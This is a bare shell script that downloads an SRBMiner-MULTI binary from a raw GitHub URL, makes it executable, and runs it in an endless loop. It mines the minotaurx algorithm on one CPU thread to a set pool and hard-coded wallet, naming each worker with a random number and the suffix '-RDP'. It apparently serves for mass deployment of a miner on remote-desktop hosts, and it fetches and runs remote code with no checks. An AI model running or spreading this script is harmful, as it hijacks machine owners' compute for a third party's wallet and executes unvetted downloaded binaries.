wget https://raw.githubusercontent.com/amit12986/code/main/SRBMiner-MULTI
chmod +x SRBMiner-MULTI
y=5
while [ y ]
do
  ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcps://stratum-eu.rplant.xyz:17068 --wallet RMLhf8ZhhnP97gVJLWLAN8qGf4Wge3bdHb.$(echo $(shuf -i 1-200 -n 1)-RDP) --password x --cpu-threads 1 --msr-use-tweaks 0 --msr-use-preset 0 --cpu-threads-intensity 1 --cpu-threads-priority 1
done
